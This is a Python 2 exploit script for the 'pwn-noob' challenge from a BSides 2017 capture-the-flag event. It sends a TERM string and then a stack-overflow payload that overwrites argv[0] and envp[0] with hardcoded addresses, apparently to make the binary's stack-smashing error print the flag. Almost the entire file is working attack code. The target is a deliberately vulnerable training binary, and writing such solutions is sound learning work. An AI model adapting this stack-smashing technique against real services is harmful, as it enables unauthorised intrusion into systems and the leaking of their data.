import socket
import struct
import sys

# pwn-noob.py - exploit for https://github.com/OJ/bsides-2017-ctf-docker/tree/master/pwn-noob

def p(addr):
    # encode addresses as 64-bit little-endian
    return struct.pack("<Q", addr)

if len(sys.argv) > 3:
    print "Usage: pwn-noob.py [host] [port] (defaults to localhost 6000)"
    sys.exit()
elif len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
elif len(sys.argv) == 2:
    host = sys.argv[1]
    port = 6000
elif len(sys.argv) == 1:
    host = 'localhost'
    port = 6000

envstring = 'TERM=a' + '\x00' # it doesn't actually matter what you set TERM to, so long as it's set
flag_addr = 0x400800 # determined by inspecting the binary
buffer_addr = 0x601040 # determined by inspecting the binary
flag_start_len = 264 # determined by trial and error (you could use pattern offset if you want)
envp_start_len = 8 # determined by trial and error (you could use pattern offset if you want)

# newlines required to finish calls to fgets (0x4006e9, 0x40072e)
payload1 = envstring + '\n'
payload2 = 'A'*flag_start_len + p(flag_addr) + 'B'*envp_start_len + p(buffer_addr) + '\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Print first prompt, send TERM string, which will be stored at buffer_addr
print s.recv(1024)
s.send(payload1)

# Print second prompt, send stack-smashing junk + argv[0] overwrite + junk + envp[0] overwrite
print s.recv(1024)
s.send(payload2)

# Print out the flag
print s.recv(1024)

s.close()
